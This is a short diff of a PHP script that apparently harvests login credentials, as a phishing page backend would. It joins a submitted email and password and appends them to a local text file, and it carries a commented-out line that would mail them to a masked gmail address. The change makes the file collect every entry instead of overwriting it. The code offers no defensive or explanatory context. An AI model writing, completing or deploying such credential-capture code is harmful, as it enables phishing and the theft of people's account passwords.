@@ -8,7 +8,7 @@ $message= $email."  ".$password;
 //mail('xxxxxxxxx@gmail.com', 'My Subject', $message);
 
 // when running locally writing to a file is better for checking purposes
-$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
+$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
 fwrite($myfile, $message);
 fclose($myfile);
 
